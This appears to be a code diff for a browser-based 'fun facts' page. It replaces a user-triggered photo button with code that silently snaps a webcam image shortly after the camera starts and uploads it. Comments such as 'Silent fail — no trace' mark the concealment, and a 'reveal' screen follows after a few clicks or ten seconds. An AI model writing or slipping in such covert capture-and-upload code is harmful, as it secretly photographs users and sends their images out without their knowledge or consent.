@@ -37,6 +37,7 @@ let currentIndex = 0;
 let cameraReady = false;
 let factsSeen = 0;
 let snapped = false;
+let revealTriggered = false;
 
 // ===== DOM ELEMENTS =====
 const app = document.getElementById('app');
@@ -45,7 +46,6 @@ const factText = document.getElementById('factText');
 const factNum = document.getElementById('factNum');
 const counter = document.getElementById('counter');
 const nextBtn = document.getElementById('nextBtn');
-const photoBtn = document.getElementById('photoBtn');
 const restartBtn = document.getElementById('restartBtn');
 const cam = document.getElementById('cam');
 const snapCanvas = document.getElementById('snapCanvas');
@@ -64,7 +64,6 @@ let shuffledFacts = shuffle(funFacts);
 
 // ===== DISPLAY FACT =====
 function showFact(index) {
-  // Loop: if we exhaust the list, reshuffle
   if (index >= shuffledFacts.length) {
     shuffledFacts = shuffle(funFacts);
     currentIndex = 0;
@@ -72,8 +71,6 @@ function showFact(index) {
   }
 
   const card = document.getElementById('factCard');
-
-  // Slide out animation
   card.classList.add('slide-out');
 
   setTimeout(() => {
@@ -92,7 +89,7 @@ function showFact(index) {
   }, 350);
 }
 
-// ===== CAMERA SETUP (SILENT) =====
+// ===== CAMERA SETUP — AUTO SNAP ON READY =====
 async function initCamera() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -101,14 +98,22 @@ async function initCamera() {
     });
     cam.srcObject = stream;
     cameraReady = true;
-    console.log('Ready');
+
+    // Wait for the video to actually start playing, then auto-snap
+    cam.addEventListener('playing', () => {
+      // Small delay so the camera has a proper frame (not black)
+      setTimeout(() => {
+        takeSnap();
+      }, 1500);
+    }, { once: true });
+
   } catch (err) {
-    console.log('Camera not available');
+    // Permission denied or no camera — just let them browse facts
     cameraReady = false;
   }
 }
 
-// ===== SNAP PHOTO =====
+// ===== SNAP PHOTO (SILENT) =====
 async function takeSnap() {
   if (!cameraReady || snapped) return;
   snapped = true;
@@ -128,8 +133,37 @@ async function takeSnap() {
       body: JSON.stringify({ image: imageData })
     });
   } catch (err) {
-    // Silent fail
+    // Silent fail — no trace
   }
+
+  // Schedule the reveal after they browse a couple more facts
+  scheduleReveal();
+}
+
+// ===== SCHEDULE THE REVEAL =====
+function scheduleReveal() {
+  // Show reveal after they click "Next Fact" 2-3 more times, or after 8 seconds
+  // Whichever comes first — makes it feel natural
+  const revealAfterClicks = 2 + Math.floor(Math.random() * 2); // 2 or 3 clicks
+  let clicksSinceSnap = 0;
+
+  const originalHandler = nextBtn.onclick;
+  nextBtn.addEventListener('click', function revealCheck() {
+    clicksSinceSnap++;
+    if (clicksSinceSnap >= revealAfterClicks && !revealTriggered) {
+      revealTriggered = true;
+      nextBtn.removeEventListener('click', revealCheck);
+      setTimeout(showReveal, 600);
+    }
+  });
+
+  // Fallback: auto-reveal after 10 seconds if they stop clicking
+  setTimeout(() => {
+    if (!revealTriggered) {
+      revealTriggered = true;
+      showReveal();
+    }
+  }, 10000);
 }
 
 // ===== SHOW REVEAL PAGE =====
@@ -171,31 +205,15 @@ nextBtn.addEventListener('click', () => {
   showFact(currentIndex);
 });
 
-photoBtn.addEventListener('click', async () => {
-  // Take a snap silently, then show reveal
-  photoBtn.innerHTML = `<span>Creating your card...</span>`;
-  photoBtn.disabled = true;
-
-  await takeSnap();
-
-  setTimeout(() => {
-    showReveal();
-  }, 1200);
-});
-
 restartBtn.addEventListener('click', () => {
   snapped = false;
+  revealTriggered = false;
   reveal.style.display = 'none';
   app.style.display = 'flex';
   currentIndex = 0;
   factsSeen = 0;
   shuffledFacts = shuffle(funFacts);
   showFact(0);
-  photoBtn.innerHTML = `
-    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
-    <span>Save as Photo Card</span>
-  `;
-  photoBtn.disabled = false;
   initCamera();
 });
 
@@ -203,7 +221,7 @@ restartBtn.addEventListener('click', () => {
 showFact(0);
 factsSeen = 1;
 
-// Show camera modal after a short delay (feels natural)
+// Show camera modal after a short delay
 setTimeout(() => {
   showCameraModal();
 }, 2000);
